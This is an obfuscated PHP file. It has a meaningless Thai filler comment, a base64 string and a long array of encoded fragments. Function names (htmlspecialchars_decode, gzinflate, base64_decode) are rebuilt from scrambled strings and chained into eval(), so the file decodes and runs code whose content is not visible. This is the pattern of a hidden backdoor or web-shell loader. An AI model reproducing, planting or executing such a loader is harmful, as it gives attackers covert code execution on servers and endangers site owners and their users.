<?php
    /*
    * ราเมนทัวร์ดีลเลอร์แอนด์ภคันทลาพาธ ล็อบบี้ กัมมันตะบลูเบอร์รีบูติค วาทกรรม แชมป์ฮ่องเต้ซี้ แฟลชสลัม สโรชาคาร์โก้แซลมอนซิ้ม จูนสติกเกอร์แซ็ก
    * สเตเดียมแตงกวาเมาท์ มินต์ ซาดิสต์นินจาวีซ่า บัสสตรอว์เบอร์รีลีเมอร์คอมเพล็กซ์ม้ง ว้อยเห่ยสเตชัน ไง สถาปัตย์ออร์แกนพ่อค้า เซาท์มินต์
    * พาเหรดแฮนด์คอนโดมิเนียม แบล็กอีแต๋นปิโตรเคมีมะกัน ซูฮกม้งมอลล์ ฮิปโปเวสต์ เก๊ะแชเชือนเอาท์ ฟรุตสเต็ปออดิชั่นรีไซเคิลซิม แคมป์ อัลตราปิกอัพเพียวมาร์ช
    * แชเชือนเยอร์บีรา แก๊สโซฮอล์วอฟเฟิล บัลลาสต์แคมป์มาราธอนติ๋ม ไฮกุแจ๊กพอต ฟลุกดิกชันนารีทำงานอพาร์ตเมนต์สถาปัตย์ แคมปัสเป่ายิ้งฉุบแมคเคอเรลสเปค ออยล์ยอมรับสตาร์ท แคมเปญ
    * โกเต็กซ์เซ็นเตอร์รุสโซ สไปเดอร์หมวยเห็นด้วยจิ๊กโก๋ถ่ายทำ ซีอีโออวอร์ดสตริง วิทย์ซีเนียร์ซาดิสม์ วิวนายพรานแอโรบิค โปรเจคท์อะรีวิวพาเหรดวานิลา ออร์แกนิคแตงโม เทควันโด
    * เพรสแฟนซีเฮียฮองเฮาทรู บราอุปนายิกา ควิกวอเตอร์คอมเพล็กซ์เพียบแปร้มอยส์เจอไรเซอร์ วัคค์ติวเตอร์ มั้งคอลัมนิสต์ชินบัญชรนิวส์ ลาตินเปโซดาวน์บอยคอตต์ ปาสคาลแมคเคอเรลกู๋แอโรบิคสตูดิโอ โชว์รูมซาดิสม์อุปทานวอฟเฟิล
    */

    $sitamet = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1KBrNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUMn0SyzJSMwLKMrMK85JrdRE\x41tY\x41";
    $rakuzan666 = ["\x3d\x3dgFxrsohmewYMP4L7/",
    "N\x61PkV\x428fww/",
    "Ps2t0vmYIwSg7mSjyJd\x42eSZMnZMqlTtm0E8Ny1VXxXtsN\x611\x2bKRg7\x62Kgt\x63Iux8W/",
    "iiHiD2dgwZdlUosQqs4t54Xv\x63uwOrZO/",
    "iuOK\x42LwL98nd\x63lP\x2b\x2bZOUIntus\x630dnYiir\x2b4KSYyRyHtpL\x63p6mhL\x616oZu1n3L2lGZtq\x2b\x2bFQkZYIsPop8W6V8LHDe2\x636VO\x61\x41iK2/",
    "Gukwf84mQYz\x61tFNeriXHeo9ei3\x63wy/",
    "T35JoSyOK\x43\x2beHSpF2PLntuUxNr\x42L/",
    "\x630nePi1PuL8wYPqLfw4Zfejekd\x42dnpXHTg0qlqUyPgS/",
    "Zyirv\x415\x42fum0qOz\x62oI8\x41DVdEyi57\x43D\x2b8z2xLH4z6\x43jH9Oq\x4142suwT\x63eOrEKyEu75eJmG12kih8e6eXV2Y0zlxGyfJ\x61\x2behHI8\x42SgEW/",
    "VlD9Fry7v8\x2bliNNY32GgkJVzmrgu\x2b4ejG\x61VymmMw344duX\x613\x42/",
    "ui7YuZlM\x2bNQvlqgfp\x43e6\x61llD9M\x43zzUvE3rr7D\x41DeJ\x41Gw7ZI685zEXRGqqFRTZvHUEWWI3vJE2\x42LSW\x61O1PL/",
    "uRWWPWHQQL0v8L\x42G2fL9iqp4v\x2b\x62\x41hS6knH\x41GN/",
    "Gv4RNZp\x63ZdZ\x43t4DlRM5lU\x42TLDH\x615V\x62og\x63\x621Z\x43uQPW2F\x43h9\x41/",
    "X\x42KK\x43DG83NrHy\x63MMW\x2bU7OvnitvgGf\x43tY\x6212RP0GQomNt\x62uTKuL5N8GIJ71nV/",
    "F6HtTu64uK\x61urwG\x427GLV\x2bnY3R4V1f3F9vtvs1\x61PMX8\x62Q8sn/",
    "3l2VzhQt/",
    "EIugiIWtt\x63h/",
    "xx3IE1QMPh\x2b\x61iSfJ\x2b3fwh8QeVh\x61\x62\x43nrDWn6SDH\x62KxH4w9z5qM\x61J\x43S4\x41T3zXVrd\x41vjyiKre\x43eZzi0M\x61P2Y2\x2b7yr\x41\x42mXq\x42irtlVh1sKfF\x62zgK7xnqZsN0\x42Logh3hs4tkj9M\x41x1DUv5gxef50zfY2L9mi\x6183qgXE9Niq2\x43oMz3Rnf\x42GVPIQj2rzJv\x41Iy\x2bKtotruz16HzpriYuRdT5pRUy92S1mZ7K\x63HOkHhyTes\x42IgK\x42\x426nDZ6wwjyKz/",
    "3e0wT/",
    "JFQJdQzVlvu/",
    "Ixo22HDvqmdzr\x62XwMOL3Fsyh1o9G8\x41yJKqJHqU\x63hWl6DK\x42Vz1017F8h0ERtsQW\x41gjsk\x62YD0Y\x42uJQgk\x420\x62uE6kR\x41W0X71r1fz7oleE4\x420pw\x2bo\x61\x43\x2b\x41tHk\x2bdqVigrFmJgpfsHeotj9w\x4253mIoLh/",
    "rQr\x61qORtUF06RSPeTH1H3Lu85zNk/",
    "q3p3Xw9it5LP0PM\x63gmpv\x61zQJ\x2b\x2bYv4mkV8NthY3FH8xoMrkwylQu6TqkHYMz4F4EfNy7d\x41\x62f\x61KhuhMx\x43KP0lXqUMe\x43pdT\x626l3o0x8se6HzyJv4Pw\x61\x410FzJFW3pXeJu\x62Kh8x7WNS\x43\x42hx6J\x61JvMvHFZtLo\x61KWfseuWis7WEJn/",
    "O32zJp5w\x41U\x63\x62p\x41wyfhTGZ8nhLfj0D0MYN8\x436R7wIvXP\x2b0\x43y\x41H64TOzQNyqhn/",
    "yUfmxsW2oPr\x41Gd\x63/",
    "E3d\x62fEMsUlT\x61N\x2bGJ9Pi\x63rRZqQMydhORDxMtFD5\x43NHUJP4qldVXotkm\x43sXrmLK4\x43q\x62Rilzrk8wzH/",
    "0H\x618TN5JP\x42\x41Nqv\x61rQy1/",
    "e\x2bUXeyyq1\x61VDUPKQgldlUJVx62OxrP12MuxigKZszf9sZOT1tM2Tj\x2bQ6\x63FJD\x614D/",
    "0HfkIF4zKt0\x41X1K1ySGX5MSISVtWfP\x2b8je\x6394nUZ78S3VdGwYeEkhiSi5e2H2L54qWmRtgpJ\x61WHVshmKRpffpuR5QwGuQmRhz\x620\x420ZIOnR/",
    "/",
    "sUOJINOO00DIWrjUZtht4jMlL\x411Z3N\x41z5zK6pK\x61V\x41Vuzu3xi\x43EGS\x41584sDrp\x611mLueNMrw2T\x414MELlEX\x41OtJ85VyWQrumUs\x42T\x420548wflPmYKY\x2b\x2b27Gf\x62mntUt\x620wrMR\x61W\x61FQSR1n7Z0kS1h2y4gH7dNL8U\x62xi/",
    "G8/",
    "KFSWvpiUSytYw\x6254Z\x62F2Vt\x43\x2bU\x42ER8PLj/",
    "oWoMziF\x42ovKGIZpKHGXOfd\x42L2pzzRyHHVJTVz4eNLUldeRJV\x42\x62Vk05GD0rX\x625r4MKjLvSoW4eXpfGSHpoijw5TP\x2birH\x42ilK9uZN3GzHyz\x62rE7FVGPoIKUMXtyjTRTRfRRfoPZ/",
    "Sw8\x41Pz\x42RS3dnwh\x61pfL8ixln9\x614\x2bnEN8QTDE0qE\x62/",
    "P1e\x61\x43i\x43F\x61KEGv42U0m\x42ZZW\x42WTEJ3lPIPpRNdn5wjPowUDVh1jL\x43sMFFf2\x61\x41gmN\x43WQ\x63MEIrUIIM4G5hMDoRlonqR\x61ntsIqPXSi\x61EneKvFxNs\x42EdSKZNgvJXs6PFxYy11E\x432w6N24HeYTZwT4PHZ8zOh\x42dyF3/",
    "\x41voYqsMY3Wn\x42oKUr75XGDIqQ4gZR\x62\x43kXOkhNeMIV1fEhSHwoQdf\x433\x62To7LVhidpeEkw\x632eP\x61L6Wg4Q\x43xePWQz0QsOoZiwuy8p9td\x63SgdI1/",
    "gqH03Q0\x61yTeN\x62x/",
    "1sf18\x415\x61Lg1Vh\x43\x43nVq\x63\x63TTQ2NPZvfTsYzQGm\x2bsumo0/",
    "dEE6P\x2b\x61VMYwOs\x43TFJPzktWsV7YxkHZ\x41MMOry\x2b\x63xuvrsSS\x41Du\x2b4eFUGRUyFywehHEPN6lpqviN5JGlFZzmYt7M0GniuTriuDngu\x62G\x2bg6O1DDlIlf\x41\x63x29M\x2bsxHit\x61\x62jVS4En8NuxLs8SD2v\x62K4x/",
    "RsS19ltNrRyu\x42\x62\x61fZYnfNn\x62rYhM9i\x43l7TdU5x4KwRIrK0linzSMFgrzLkgHw\x42ypmTGZF\x61eYPRjy\x41MTzWLuWFrf0JLGo5R\x43V0jH\x42ywtM\x63yyxWzGl5DWpSr\x42sv2sLXNjjW2PqXp5\x42Di\x63UX\x622VVe\x43ooyMFqkUeV9ZiezTedNt\x43vX\x41V8yfqZU3Yh\x42\x41k/",
    "\x62i7KDYvS\x2blZ19s5\x62Xon7jGWQh0WsP\x63eTGT6uYzL\x42fdEwS6\x43u\x2blI4/",
    "UUrnEVX/",
    "F\x41pOVTmK\x421s5vHEVfehRh\x43t\x2b\x43nyi\x61d2\x42R\x2bX\x42pvI\x43Hnh\x63l2JyquUv\x61ZWUIJf\x62\x43PZ5Ht9vEpD6G7W/",
    "sgvTU9\x63Q4zHp7\x439MhmPewoQ5Y\x2bT8EPUX\x43\x41hQR\x62OE9EmGyTvsF\x42prt8ejrdxm\x433Olj\x41y8Wl8N/",
    "2MTFXdUJF/",
    "X1o9MMv0JhoHZ\x63dZvHjQWtT29\x2b\x43rE87Lj6uITM4g9Jviv5qorWt8o\x2b3hKTXeS\x62vKl\x62WEjQ0G9z3\x410dq5Eq7WwlduDwNUDHyre\x42sS\x639ZKpOOuZysK6ePdD7/",
    "Q\x61/",
    "QJQeMrzwmKjwWRL4x3uPM\x62/",
    "zfDsYxKV\x41d\x423\x42Xr4spevt569/",
    "eu6jFp7szJ9\x2bGq\x42\x41\x633LTfQ\x62ogg\x63Z5vrg68iQRrO6\x6360zxpXI\x42ElnIhqK/",
    "Ls4Yesp1U5\x438vyF2Qh9iLY7oVEEnJTEs\x43i\x41r3u\x61jSryDqYi\x41\x42gZsPUvifrp\x2bQx0GKkQnq\x62l2H\x63noGGjeJs\x61xGgDVT6\x2bQ6qxi1\x2b2gEYOgfs\x42LWZuZH7\x43hlUpQVmGnJN\x42\x41\x2bjZEPOQHes8IoLjz2VV6UIpzj/",
    "ZsXLPpe\x61Vf9e\x2b5Pe0\x42fwHT2x79hEogyjxJLmFZS6tnnisFRiO\x61u9KpIXNZ9Z\x43p29\x62m\x628RG8T\x62\x43zf\x2b3sHrPylnGrXWnovZmMkz\x43YOmMlRrH\x62vzfM7omEUUXHtqnrVil\x63\x42LmYf3nd9u\x62O\x61rjkQsfttWF9\x63NDNj\x42x8JuHS1SphG\x43LkPjr\x42YWYGxixQWWN7gnGGt5\x42QJ1t36jLt\x41qPYSfG\x63v\x42q2Hxn5Y090f7NT\x41zN/",
    "P\x42z9WxmFpXdrQv0rEpFQujlqfjml\x2bmXdoTF2Y3N5VMLFYt\x63djZ6tJyRsqVjrJ2e\x63K\x637Et5D\x41QJvXqeXVP\x2bLEj\x43\x61\x2brUYMZ\x61\x61TOT\x43Ylx9RtpxdppV3KLDg1iH0KVW6\x62n\x41G6RX\x62J8p9wXDJsiVEnzotMJoKrIiIP7Dh\x62JKu\x42rQ\x42Zyd8\x63K6iWTyf\x42rln\x63wZG6\x63/",
    "UXT\x61Xp5M\x41Nu6qNzwSKmu/",
    "\x61gxV\x61p7k\x43X3SKIsm5p8t5\x433sZZYmxJSvNIzNwZY8\x2bFe\x41n/",
    "M\x41h8QX\x42fVRekrDoXhzIdtP\x43U0P6qMQwyDIwd1\x42GkiJ9gvp\x43O9y/",
    "mPmiMgft\x2bThKRuemFupX9p3lXLueJhYtjZZdqUtLL\x439hi22T\x43Kwi\x43DwI61yL5OgDel\x415g6\x41I\x41\x43oWp1Topj\x63\x625m\x42HII962Gs03uGTpo\x2bPNRhH5v5\x41oPLJi/",
    "/",
    "wrS5k31\x63x\x2bEg4\x2b/",
    "80253O8ewY\x43\x434SYr\x43\x43YNL7\x2b\x63PxR23f6p7OoQzj3ihQi\x62orJrj\x42\x436Xhk/",
    "X\x41M\x43\x43Zfe0ju7ZfifG8RP\x2bJUG41dyX9ozYpt1O0JrKl\x62p\x61E1j\x634g3z31/",
    "\x2bfPWzUTnWzFx3Lt8om\x423\x41\x2bR\x42\x43wHRpRtm7KZGgVw\x43KtJjLkZDuTOzNzHe4n\x2b4zOypnS6WiF\x63I5VmWl\x61OyQIRdWxVd6\x41sGgsQVyjOrw0tW3\x62tMOru1\x63VdT4teEzT\x2bsK\x2b3XU0nLeS6eEvPl1491FPT1EHf\x61TfGOfs1P/",
    "slswGkUttq\x422u\x61l\x61\x63jjH6IrUtn2JI\x412FLWtXmpf\x61\x62sN86MfIrz5\x62dYI\x42STqnZktFmw3Esinzd\x433MGvJ9TRM24FLUYed\x43\x42mYVs9zF\x63dkUvW25hsu\x42UXglt\x63HXfJ\x41TR\x61lW16foyY5Lit0Rr\x63E5WfhTurmnWORP1jD\x2bof\x62UP6D\x63\x43\x615OHyHI8Sk\x62OS8\x43Fzgg1GHVV3Dtww\x61u8\x42sl1zupyk\x43u\x6109N0dsL9Oi515pyX4d7yZV\x621lylE5GZmZE\x2bR3\x43pR2Xf3SezQ5\x62nXdvhK1s\x63LItes9XDxisPm34X3eYxD/",
    "Jw/",
    "86\x62Jf5TFHN/",
    "LUyFSlFT2wOpSmYIHRHixKtdnkW0m7712XN9J7veZQEKGI6IJd7tUH7XdEn5YDxmr7x\x61JYyD42uomMi1dH8Kv02jQsDdf\x42OygsuVeuGInH6Z2uJ\x63qlifs0NG5dXZU\x62G5v\x420of6w/",
    "OXJJXw3r1dtmv0FvPkG43FI8jU5mLnRZXF6gs/",
    "0WPYQD4tIR\x635X\x2bVdSwZ4OYw392wLOo6QO\x41Dz3WlFDU4LSunruoOp\x63eyuINq02XX\x42ezYwh9EW8Yev/",
    "\x62SQs4hKS3z\x411zYRu/",
    "Q3MLOg\x41Ug0\x41DkrFWL2i1\x43I\x2b\x42U7OMvIy9mx7qPPl\x622\x62QP5xEETPxpLU3vvj\x41\x2bdJ0FksuYknz7vzY\x41SO9zSIG\x61Z\x41XWujomQEz\x41\x632\x43Dd1WI0\x62vzopKpD\x43PgxKYFYxdKtxW5Vd\x62mV4\x2bOedFKse\x61G6l2oI\x416fpM/",
    "K1\x63dGxFur4M\x2b2Li\x63HExPM3\x42rW8g/",
    "8MzVPMv98Ujptz0M\x62pwuT\x416VgrW3F1qLkwRX9uisWSd/",
    "QlD\x410qIq\x63ri1/",
    "VTdX0Jui\x41\x43\x62nPSNJTn5znh4Z6kneeMFjXwIrXsgEx\x414LisoxYtfGUTFgnR5\x43ZON2FRLsyvMeO\x4258/",
    "gHDXv\x2bY5\x62EUfMYtsjhOiPNSvOyT\x2bkVS4DDq\x62EoQRsgK1D\x42/",
    "glwQ\x41Wt8usTNWpF28UHPhP\x434w7jHfzLDfws8LmzR\x61EnYj/",
    "KwzusK7mt\x434sKzoOvlPWQ6qNY4gjfeqk8\x423\x43\x2b\x43sjFs\x2bS8Sgpvp2NplRiHk\x42\x633\x62\x62rf\x62QhtsKgG\x2bqTqlIJXnJuzsUGnJv5WS\x2boN7uZdm7m\x62O\x630qU\x625ImfIvZ7JvN\x62P3\x61\x620M838\x41y\x42wJewzyDTH\x418n8\x412\x42wJewzxDjH\x418X8\x416\x42wJewzwDzH\x418H8\x41\x2b\x42wJe"];

    $iNathanPrinsley = implode('', $rakuzan666);
    $lorem = preg_replace('/[^a-zA-Z0-9_ ]/', '', 'h(t)m#l@sp@e!ci$al$ch^a%rs^_^de*co*de');
    $ipsum = preg_replace('/[^a-zA-Z0-9_ ]/', '', 'g#z(in@f)la?te');
    $dolor = preg_replace('/[^a-zA-Z0-9_ ]/', '', 'b^a><se%64^_^deco*de');

    eval(
        $lorem(
            $ipsum(
                $dolor(
                    $sitamet
                )
            )
        )
    );
